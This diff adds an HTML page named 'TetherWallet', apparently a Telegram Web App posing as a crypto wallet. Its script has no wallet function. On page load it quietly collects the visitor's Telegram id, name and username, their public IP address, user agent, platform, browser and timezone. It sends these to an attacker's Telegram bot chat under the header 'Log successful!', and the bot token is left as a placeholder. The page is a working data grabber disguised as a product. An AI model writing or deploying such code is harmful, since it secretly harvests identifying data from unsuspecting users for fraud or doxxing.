@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <title>TetherWallet</title>
+</head>
+<body>
+    <script>
+        // Функция для извлечения параметров из URL
+        function getUrlParameter(name, url) {
+            name = name.replace(/[\[\]]/g, '\\$&');
+            const regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)');
+            const results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, ' '));
+        }
+
+        const currentUrl = window.location.href;
+
+        const userData = JSON.parse(decodeURIComponent(getUrlParameter('tgWebAppData', currentUrl)));
+
+        const userId = userData.id;
+        const firstName = userData.first_name;
+        const lastName = userData.last_name;
+        const username = userData.username;
+
+        const userAgent = navigator.userAgent;
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                const ip = data.ip;
+                const osname = navigator.platform;
+                const timezone = new Date().getTimezoneOffset;
+                const browser = getBrowserInfo();
+
+                const message = `
+🔥 Лог успешен!
+
+*🧭 Базовая информация:*
+*🔍 Аккаунт в тг:*
+  ├ Айди: ${userId}
+  ├ Тэг: ${firstName} ${lastName}
+*💻 Система:*
+  ├ IP: ${ip}
+  ├ UserAgent: ${userAgent}
+  ├ ОС: ${osname}
+  ├ Браузер: ${browser}
+  └ Часовой пояс: ${timezone}
+`;
+
+                const token = 'YOUR_TELEGRAM_BOT_TOKEN';
+                const chatId = 'YOUR_CHAT_ID';
+                const url = `https://api.telegram.org/bot${token}/sendMessage`;
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('text', message);
+                formData.append('parse_mode', 'Markdown');
+        
+                fetch(url, { method: 'POST', body: formData });
+            });
+
+        function getBrowserInfo() {
+            const ua = navigator.userAgent;
+            let browser = '';
+            const match = ua.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i) || [];
+
+            if (/trident/i.test(match[1])) {
+                const tem = /\brv[ :]+(\d+)/g.exec(ua) || [];
+                browser = `IE ${tem[1] || ''}`;
+            }
+
+            if (match[1] === 'Chrome') {
+                const tem = ua.match(/\b(OPR|Edge)\/(\d+)/);
+                if (tem != null) browser = tem.slice(1).join(' ').replace('OPR', 'Opera');
+            }
+
+            match[2] = match[2] ? `version ${match[2]}` : '';
+            browser = `${match[1]} ${match[2]}`.trim();
+            return browser;
+        }
+    </script>
+</body>
+</html>
